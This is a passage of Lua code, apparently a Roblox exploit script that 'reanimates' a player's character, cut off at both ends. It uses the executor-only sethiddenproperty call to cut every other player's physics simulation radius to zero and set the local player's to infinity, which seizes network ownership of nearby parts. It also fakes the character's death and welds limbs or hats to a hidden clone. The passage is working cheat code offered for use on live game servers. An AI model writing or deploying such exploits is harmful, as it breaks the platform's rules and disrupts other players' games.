			local AttachmentC=Instance.new('Attachment',Part1); AttachmentC.Name = "AthO_"..CountSCIFIMOVIELOL
			local AttachmentD=Instance.new('Attachment',Part0); AttachmentD.Name = "AthO_"..CountSCIFIMOVIELOL
			AttachmentC.Orientation = Angle
			AttachmentA.Position = Position

			AttachmentC.Name = "Orientation"

			AlignPos.Attachment1 = AttachmentA;
			AlignPos.Attachment0 = AttachmentB;
			AlignOri.Attachment1 = AttachmentC;
			AlignOri.Attachment0 = AttachmentD;
			CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1
			game:GetService("RunService").Heartbeat:connect(function()
				Part0.Velocity = Vector3.new(0,35,0)
			end)
		end

		coroutine.wrap(function()
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:wait()
			if sethiddenproperty then
				while true do
					game:GetService("RunService").RenderStepped:Wait()
					settings().Physics.AllowSleep = false
					local TBL = game:GetService("Players"):GetChildren() 
					for _ = 1,#TBL do local Players = TBL[_]
						if Players ~= game:GetService("Players").LocalPlayer then
							Players.MaximumSimulationRadius = 0
							sethiddenproperty(Players,"SimulationRadius",0) 
						end 
					end
					game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
					sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.pow(math.huge,math.huge)*math.huge)
					if HumanDied then break end
				end
			else
				while true do
					game:GetService("RunService").RenderStepped:Wait()
					settings().Physics.AllowSleep = false
					local TBL = game:GetService("Players"):GetChildren() 
					for _ = 1,#TBL do local Players = TBL[_]
						if Players ~= game:GetService("Players").LocalPlayer then
							Players.MaximumSimulationRadius = 0
						end 
					end
					game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)
					if HumanDied then break end
				end
			end
		end)()

		if game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
			if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
				game:GetService("Players").LocalPlayer["Character"].Archivable = true 
				local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
				CloneChar.Parent = workspace 
				CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
				wait() 
				CloneChar.Humanoid.BreakJointsOnDeath = false
				workspace.Camera.CameraSubject = CloneChar.Humanoid
				CloneChar.Name = "non" 
				CloneChar.Humanoid.DisplayDistanceType = "None"
				if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
				if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

				local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
				DeadChar.HumanoidRootPart:Destroy()

				local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
				local CONVEC
				local function VECTORUNIT()
					if HumanDied then CONVEC:Disconnect(); return end
					local lookVec = workspace.Camera.CFrame.lookVector
					local Root = CloneChar["HumanoidRootPart"]
					LVecPart.Position = Root.Position
					LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
				end
				CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

				local CONDOWN
				local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
				local function KEYDOWN(_,Processed) 
					if HumanDied then CONDOWN:Disconnect(); return end
					if Processed ~= true then
						local Key = _.KeyCode
						if Key == Enum.KeyCode.W then
							WDown = true end
						if Key == Enum.KeyCode.A then
							ADown = true end
						if Key == Enum.KeyCode.S then
							SDown = true end
						if Key == Enum.KeyCode.D then
							DDown = true end
						if Key == Enum.KeyCode.Space then
							SpaceDown = true end end end
				CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

				local CONUP
				local function KEYUP(_)
					if HumanDied then CONUP:Disconnect(); return end
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = false end
					if Key == Enum.KeyCode.A then
						ADown = false end
					if Key == Enum.KeyCode.S then
						SDown = false end
					if Key == Enum.KeyCode.D then
						DDown = false end
					if Key == Enum.KeyCode.Space then
						SpaceDown = false end end
				CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

				local function MoveClone(X,Y,Z)
					VEL = 1
					LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
					workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
					wait()
					VEL = 0
				end

				coroutine.wrap(function() 
					while true do game:GetService("RunService").RenderStepped:Wait()
						if HumanDied then break end
						if WDown then MoveClone(0,0,1e4) end
						if ADown then MoveClone(1e4,0,0) end
						if SDown then MoveClone(0,0,-1e4) end
						if DDown then MoveClone(-1e4,0,0) end
						if SpaceDown then CloneChar["Humanoid"].Jump = true end
						if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
							workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
					end 
				end)()

				local con
				function UnCollide()
					if HumanDied then con:Disconnect(); return end
					for _,Parts in next, CloneChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false 
						end 
					end
					for _,Parts in next, DeadChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false
						end 
					end 
				end
				con = game:GetService("RunService").Stepped:Connect(UnCollide)

				local resetBindable = Instance.new("BindableEvent")
				resetBindable.Event:connect(function()
					game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
					resetBindable:Destroy()
					pcall(function()
						CloneChar.Humanoid.Health = 0
						DeadChar.Humanoid.Health = 0
					end)
				end)
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
							HumanDied = true
							FakeCharacter:Destroy()
							script:Destroy()
							pcall(function()
								game.Players.LocalPlayer.Character = CloneChar
								CloneChar:Destroy()
								game.Players.LocalPlayer.Character = DeadChar
								if resetBindable then
									game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
									resetBindable:Destroy()
								end
								DeadChar.Humanoid.Health = 0
							end)
							break
						end		
					end
				end)()

				SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if HumanDied then break end
						DeadChar["Torso"].CFrame = CloneChar["Torso"].CFrame
					end
				end)()



				for _,BodyParts in next, CloneChar:GetDescendants() do
					if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
						BodyParts.Transparency = 1 end end

				DeadChar.Torso["Left Shoulder"]:Destroy()
				DeadChar.Torso["Right Shoulder"]:Destroy()
				DeadChar.Torso["Left Hip"]:Destroy()
				DeadChar.Torso["Right Hip"]:Destroy()

			elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
				game:GetService("Players").LocalPlayer["Character"].Archivable = true 
				local CloneChar = game:GetService("Players").LocalPlayer["Character"]:Clone()
				game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
				local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
				Instance.new("Part",FalseChar).Name = "Head" 
				Instance.new("Part",FalseChar).Name = "Torso" 
				Instance.new("Humanoid",FalseChar).Name = "Humanoid"
				game:GetService("Players").LocalPlayer["Character"] = FalseChar
				game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
				local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
				Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
				Clone.Name = "Humanoid"
				game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
				game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 


				StickParts(FakeLimbs["Head"],FakeCharacter.Head,Vector3.new(0,0,0))
				StickParts(FakeLimbs["Right Arm"],FakeCharacter["Right Arm"],Vector3.new(90,0,0))
				StickParts(FakeLimbs["Left Arm"],FakeCharacter["Left Arm"],Vector3.new(90,0,0))
				StickParts(FakeLimbs["Right Leg"],FakeCharacter["Right Leg"],Vector3.new(90,0,0))
				StickParts(FakeLimbs["Left Leg"],FakeCharacter["Left Leg"],Vector3.new(90,0,0))
				StickParts(FakeLimbs["Torso1"],FakeCharacter.Torso,Vector3.new(90,0,0),Vector3.new(0.5,0,0))
				StickParts(FakeLimbs["Torso2"],FakeCharacter.Torso,Vector3.new(90,0,0),Vector3.new(-0.5,0,0))
				FakeCharacter.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

				wait(5.65) 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
				CloneChar.Parent = workspace 
				CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,2,0)
				wait() 
				CloneChar.Humanoid.BreakJointsOnDeath = false
				workspace.Camera.CameraSubject = CloneChar.Humanoid 
				CloneChar.Name = "non" 
				CloneChar.Humanoid.DisplayDistanceType = "None"
				if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
				if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

				FalseChar:Destroy()

				local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

				local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
				local CONVEC
				local function VECTORUNIT()
					if HumanDied then CONVEC:Disconnect(); return end
					local lookVec = workspace.Camera.CFrame.lookVector
					local Root = CloneChar["HumanoidRootPart"]
					LVecPart.Position = Root.Position
					LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
				end
				CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

				local CONDOWN
				local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
				local function KEYDOWN(_,Processed) 
					if HumanDied then CONDOWN:Disconnect(); return end
					if Processed ~= true then
						local Key = _.KeyCode
						if Key == Enum.KeyCode.W then
							WDown = true end
						if Key == Enum.KeyCode.A then
							ADown = true end
						if Key == Enum.KeyCode.S then
							SDown = true end
						if Key == Enum.KeyCode.D then
							DDown = true end
						if Key == Enum.KeyCode.Space then
							SpaceDown = true end end end
				CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

				local CONUP
				local function KEYUP(_)
					if HumanDied then CONUP:Disconnect(); return end
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = false end
					if Key == Enum.KeyCode.A then
						ADown = false end
					if Key == Enum.KeyCode.S then
						SDown = false end
					if Key == Enum.KeyCode.D then
						DDown = false end
					if Key == Enum.KeyCode.Space then
						SpaceDown = false end end
				CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

				local function MoveClone(X,Y,Z)
					LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
					workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
				end

				coroutine.wrap(function() 
					while true do game:GetService("RunService").RenderStepped:Wait()
						if HumanDied then break end
						if WDown then MoveClone(0,0,1e4) end
						if ADown then MoveClone(1e4,0,0) end
						if SDown then MoveClone(0,0,-1e4) end
						if DDown then MoveClone(-1e4,0,0) end
						if SpaceDown then CloneChar["Humanoid"].Jump = true end
						if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
							CloneChar.Humanoid.WalkToPoint = CloneChar.HumanoidRootPart.Position end
					end 
				end)()

				local con
				function UnCollide()
					if HumanDied then con:Disconnect(); return end
					for _,Parts in next, CloneChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							HumanRoot.CanCollide = false
							Parts.CanCollide = false 
						end 
					end
					for _,Parts in next, DeadChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false
							HumanRoot.CanCollide = false
						end 
					end 
				end
				con = game:GetService("RunService").Stepped:Connect(UnCollide)

				local resetBindable = Instance.new("BindableEvent")
				resetBindable.Event:connect(function()
					game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
					resetBindable:Destroy()
					CloneChar.Humanoid.Health = 0
				end)
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 then 
							HumanDied = true
							pcall(function()
								game.Players.LocalPlayer.Character = CloneChar
								CloneChar:Destroy()
								game.Players.LocalPlayer.Character = DeadChar
								if resetBindable then
									game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
									resetBindable:Destroy()
								end
								DeadChar.Humanoid.Health = 0
							end)
							break
						end		
					end
				end)()

				SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Torso"],CloneChar["Torso"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Left Arm"],CloneChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Right Arm"],CloneChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Left Leg"],CloneChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["Right Leg"],CloneChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(0,0,0))


				for _,v in next, DeadChar:GetChildren() do
					if v:IsA("Accessory") then
						if v.Name == "WDW_FoamFinger"  then
							GunHat = v.Handle
							SCIFIMOVIELOL(GunHat,m4,Vector3.new(0,0,0),Vector3.new(0,-90,-90))

						elseif v.Name == "MediHood" then
							SoldierHelm = v.Handle
							SCIFIMOVIELOL(SoldierHelm,FakeCharacter.Head,Vector3.new(0, 0.44308090209961, -0.0026588439941406),Vector3.new(0,0,0))
							print("lol")	
						end
					end
				end



				for _,BodyParts in next, CloneChar:GetDescendants() do
					if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
						BodyParts.Transparency = 1 end end
			elseif Bypass == "hats" then
				game:GetService("Players").LocalPlayer["Character"].Archivable = true 
				local DeadChar = game.Players.LocalPlayer.Character
				DeadChar.Name = "non"
				local HatPosition = Vector3.new(0,0,0)
				local HatName = "MediHood"
				local HatsLimb = {
					Rarm = DeadChar:FindFirstChild("Hat1"),
					Larm = DeadChar:FindFirstChild("Pink Hair"),
					Rleg = DeadChar:FindFirstChild("Robloxclassicred"),
					Lleg = DeadChar:FindFirstChild("Kate Hair"),
					Torso1 = DeadChar:FindFirstChild("Pal Hair"),
					Torso2 = DeadChar:FindFirstChild("LavanderHair")
				}
				HatName = DeadChar:FindFirstChild(HatName)

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
							HumanDied = true
							pcall(function()
								if resetBindable then
									game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
									resetBindable:Destroy()
								end
								DeadChar.Humanoid.Health = 0
							end)
							break
						end		
					end
				end)()

				local con
				function UnCollide()
					if HumanDied then con:Disconnect(); return end
					for _,Parts in next, DeadChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false
						end 
					end 
				end
				local con2
				function UnCollide2()
					if HumanDied then con:Disconnect(); return end
					for _,Parts in next, FakeCharacter:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false
						end 
					end 
				end
				con = game:GetService("RunService").Stepped:Connect(UnCollide)
				con2 = game:GetService("RunService").Stepped:Connect(UnCollide2)

				SCIFIMOVIELOL(HatName.Handle,DeadChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(HatsLimb.Torso1.Handle,DeadChar["Torso"],Vector3.new(0.5,0,0),Vector3.new(90,0,0))
				SCIFIMOVIELOL(HatsLimb.Torso2.Handle,DeadChar["Torso"],Vector3.new(-0.5,0,0),Vector3.new(90,0,0))
				SCIFIMOVIELOL(HatsLimb.Larm.Handle,DeadChar["Left Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
				SCIFIMOVIELOL(HatsLimb.Rarm.Handle,DeadChar["Right Arm"],Vector3.new(0,0,0),Vector3.new(90,0,0))
				SCIFIMOVIELOL(HatsLimb.Lleg.Handle,DeadChar["Left Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))
				SCIFIMOVIELOL(HatsLimb.Rleg.Handle,DeadChar["Right Leg"],Vector3.new(0,0,0),Vector3.new(90,0,0))

				for i,v in pairs(HatsLimb) do
					v.Handle:FindFirstChild("AccessoryWeld"):Destroy()
					if v.Handle:FindFirstChild("Mesh") then v.Handle:FindFirstChild("Mesh"):Destroy() end
					if v.Handle:FindFirstChild("SpecialMesh") then v.Handle:FindFirstChild("SpecialMesh"):Destroy() end
				end
				HatName.Handle:FindFirstChild("AccessoryWeld"):Destroy()
			end
		else
			if Bypass == "limbs" then --------------------------------------------------------------------------------------------------------------------
				game:GetService("Players").LocalPlayer["Character"].Archivable = true 
				local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
				CloneChar.Parent = workspace 
				CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
				CloneChar.Humanoid.BreakJointsOnDeath = false
				workspace.Camera.CameraSubject = CloneChar.Humanoid 
				CloneChar.Name = "non" 
				CloneChar.Humanoid.DisplayDistanceType = "None"
				if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
				if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

				local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]
				DeadChar.HumanoidRootPart:Destroy()

				local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
				local CONVEC
				local function VECTORUNIT()
					if HumanDied then CONVEC:Disconnect(); return end
					local lookVec = workspace.Camera.CFrame.lookVector
					local Root = CloneChar["HumanoidRootPart"]
					LVecPart.Position = Root.Position
					LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
				end
				CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

				local CONDOWN
				local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
				local function KEYDOWN(_,Processed) 
					if HumanDied then CONDOWN:Disconnect(); return end
					if Processed ~= true then
						local Key = _.KeyCode
						if Key == Enum.KeyCode.W then
							WDown = true end
						if Key == Enum.KeyCode.A then
							ADown = true end
						if Key == Enum.KeyCode.S then
							SDown = true end
						if Key == Enum.KeyCode.D then
							DDown = true end
						if Key == Enum.KeyCode.Space then
							SpaceDown = true end end end
				CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

				local CONUP
				local function KEYUP(_)
					if HumanDied then CONUP:Disconnect(); return end
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = false end
					if Key == Enum.KeyCode.A then
						ADown = false end
					if Key == Enum.KeyCode.S then
						SDown = false end
					if Key == Enum.KeyCode.D then
						DDown = false end
					if Key == Enum.KeyCode.Space then
						SpaceDown = false end end
				CONUP = game:GetService("UserInputService").InputEnded:Connect(KEYUP)

				local function MoveClone(X,Y,Z)
					LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
					workspace["non"].Humanoid.WalkToPoint = LVecPart.Position
				end

				coroutine.wrap(function() 
					while true do game:GetService("RunService").RenderStepped:Wait()
						if HumanDied then break end
						if WDown then MoveClone(0,0,1e4) end
						if ADown then MoveClone(1e4,0,0) end
						if SDown then MoveClone(0,0,-1e4) end
						if DDown then MoveClone(-1e4,0,0) end
						if SpaceDown then CloneChar["Humanoid"].Jump = true end
						if WDown ~= true and ADown ~= true and SDown ~= true and DDown ~= true then
							workspace["non"].Humanoid.WalkToPoint = workspace["non"].HumanoidRootPart.Position end
					end 
				end)()

				local con
				function UnCollide()
					if HumanDied then con:Disconnect(); return end
					for _,Parts in next, CloneChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false 
						end 
					end
					for _,Parts in next, DeadChar:GetDescendants() do
						if Parts:IsA("BasePart") then
							Parts.CanCollide = false
						end 
					end 
				end
				con = game:GetService("RunService").Stepped:Connect(UnCollide)

				local resetBindable = Instance.new("BindableEvent")
				resetBindable.Event:connect(function()
					game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
					resetBindable:Destroy()
					CloneChar.Humanoid.Health = 0
				end)
				game:GetService("StarterGui"):SetCore("ResetButtonCallback", resetBindable)

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if not CloneChar or not CloneChar:FindFirstChild("Head") or not CloneChar:FindFirstChild("Humanoid") or CloneChar:FindFirstChild("Humanoid").Health <= 0 or not DeadChar or not DeadChar:FindFirstChild("Head") or not DeadChar:FindFirstChild("Humanoid") or DeadChar:FindFirstChild("Humanoid").Health <= 0 then 
							HumanDied = true
							pcall(function()
								game.Players.LocalPlayer.Character = CloneChar
								CloneChar:Destroy()
								game.Players.LocalPlayer.Character = DeadChar
								if resetBindable then
									game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
									resetBindable:Destroy()
								end
								DeadChar.Humanoid.Health = 0
							end)
							break
						end		
					end
				end)()

				for _,v in next, DeadChar:GetChildren() do
					if v:IsA("Accessory") then
						v:Clone().Parent = CloneChar
					end
				end

				for _,v in next, DeadChar:GetDescendants() do
					if v:IsA("Motor6D") and v.Name ~= "Neck" then
						v:Destroy()
					end
				end

				SCIFIMOVIELOL(DeadChar["Head"],CloneChar["Head"],Vector3.new(0,0,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["UpperTorso"],CloneChar["Torso"],Vector3.new(0,0.2,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LowerTorso"],CloneChar["Torso"],Vector3.new(0,-0.78,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftUpperArm"],CloneChar["Left Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftLowerArm"],CloneChar["Left Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftHand"],CloneChar["Left Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightUpperArm"],CloneChar["Right Arm"],Vector3.new(0,0.375,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightLowerArm"],CloneChar["Right Arm"],Vector3.new(0,-0.215,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightHand"],CloneChar["Right Arm"],Vector3.new(0,-0.825,0),Vector3.new(0,0,0))

				SCIFIMOVIELOL(DeadChar["LeftUpperLeg"],CloneChar["Left Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftLowerLeg"],CloneChar["Left Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["LeftFoot"],CloneChar["Left Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightUpperLeg"],CloneChar["Right Leg"],Vector3.new(0,0.575,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightLowerLeg"],CloneChar["Right Leg"],Vector3.new(0,-0.137,0),Vector3.new(0,0,0))
				SCIFIMOVIELOL(DeadChar["RightFoot"],CloneChar["Right Leg"],Vector3.new(0,-0.787,0),Vector3.new(0,0,0))

				coroutine.wrap(function()
					while true do
						game:GetService("RunService").RenderStepped:wait()
						if HumanDied then break end
						DeadChar["UpperTorso"].CFrame = CloneChar["Torso"].CFrame * CFrame.new(0,0.2,0)
					end
				end)()

				for _,v in next, DeadChar:GetChildren() do
					if v:IsA("Accessory") then
						SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
					end
				end

				for _,BodyParts in next, CloneChar:GetDescendants() do
					if BodyParts:IsA("BasePart") or BodyParts:IsA("Part") then
						BodyParts.Transparency = 1 end end

			elseif Bypass == "death" then --------------------------------------------------------------------------------------------------------------------
				game:GetService("Players").LocalPlayer["Character"].Archivable = true 
				local CloneChar = game:GetObjects("rbxassetid://5227463276")[1]
				game:GetService("Players").LocalPlayer["Character"].Humanoid.WalkSpeed = 0 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.JumpPower = 0 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.AutoRotate = false
				local FalseChar = Instance.new("Model", workspace); FalseChar.Name = ""
				Instance.new("Part",FalseChar).Name = "Head" 
				Instance.new("Part",FalseChar).Name = "UpperTorso"
				Instance.new("Humanoid",FalseChar).Name = "Humanoid"
				game:GetService("Players").LocalPlayer["Character"] = FalseChar
				game:GetService("Players").LocalPlayer["Character"].Humanoid.Name = "FalseHumanoid"
				local Clone = game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Clone()
				Clone.Parent = game:GetService("Players").LocalPlayer["Character"]
				Clone.Name = "Humanoid"
				game:GetService("Players").LocalPlayer["Character"]:FindFirstChild("FalseHumanoid"):Destroy() 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0 
				game:GetService("Players").LocalPlayer["Character"] = workspace[game:GetService("Players").LocalPlayer.Name] 
				wait(5.65) 
				game:GetService("Players").LocalPlayer["Character"].Humanoid.Health = 0
				CloneChar.Parent = workspace 
				CloneChar.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer["Character"].HumanoidRootPart.CFrame * CFrame.new(0,0.5,0.1)
				wait() 
				CloneChar.Humanoid.BreakJointsOnDeath = false
				workspace.Camera.CameraSubject = CloneChar.Humanoid 
				CloneChar.Name = "non" 
				CloneChar.Humanoid.DisplayDistanceType = "None"
				if CloneChar.Head:FindFirstChild("face") then CloneChar.Head:FindFirstChild("face"):Destroy() end
				if workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face") then workspace[game:GetService("Players").LocalPlayer.Name].Head:FindFirstChild("face").Parent = CloneChar.Head end

				FalseChar:Destroy()

				local DeadChar = workspace[game:GetService("Players").LocalPlayer.Name]

				local LVecPart = Instance.new("Part", workspace) LVecPart.CanCollide = false LVecPart.Transparency = 1
				local CONVEC
				local function VECTORUNIT()
					if HumanDied then CONVEC:Disconnect(); return end
					local lookVec = workspace.Camera.CFrame.lookVector
					local Root = CloneChar["HumanoidRootPart"]
					LVecPart.Position = Root.Position
					LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 9999, lookVec.Y, lookVec.Z * 9999))
				end
				CONVEC = game:GetService("RunService").Heartbeat:Connect(VECTORUNIT)

				local CONDOWN
				local WDown, ADown, SDown, DDown, SpaceDown = false, false, false, false, false
				local function KEYDOWN(_,Processed) 
					if HumanDied then CONDOWN:Disconnect(); return end
					if Processed ~= true then
						local Key = _.KeyCode
						if Key == Enum.KeyCode.W then
							WDown = true end
						if Key == Enum.KeyCode.A then
							ADown = true end
						if Key == Enum.KeyCode.S then
							SDown = true end
						if Key == Enum.KeyCode.D then
							DDown = true end
						if Key == Enum.KeyCode.Space then
							SpaceDown = true end end end
				CONDOWN = game:GetService("UserInputService").InputBegan:Connect(KEYDOWN)

				local CONUP
				local function KEYUP(_)
					if HumanDied then CONUP:Disconnect(); return end
					local Key = _.KeyCode
					if Key == Enum.KeyCode.W then
						WDown = false end
					if Key == Enum.KeyCode.A then
						ADown = false end
					if Key == Enum.KeyCode.S then
